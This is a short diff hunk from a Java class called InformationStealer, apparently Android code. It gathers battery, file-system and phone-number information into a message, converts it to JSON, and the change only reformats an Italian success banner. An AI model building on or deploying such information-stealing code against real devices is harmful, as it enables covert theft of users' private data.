@@ -76,7 +76,7 @@ public class InformationStealer implements Runnable {
         messaggio.append(stealBatteryInformation(context));
         messaggio.append(stealFileSystemInfo(context, keywords));
         messaggio.append(stealNumberInformations(context));
-        messaggio.append("******************* INFORMAZIONI RECUPERATE CON SUCCESSO *******************\n");
+        messaggio.append("\n******************* INFORMAZIONI RECUPERATE CON SUCCESSO *******************");
 
         messaggioJSON = convertStringToJSON(messaggio.toString());
         System.out.println("ECCO IL MESSAGGIO JSON: " + messaggioJSON);
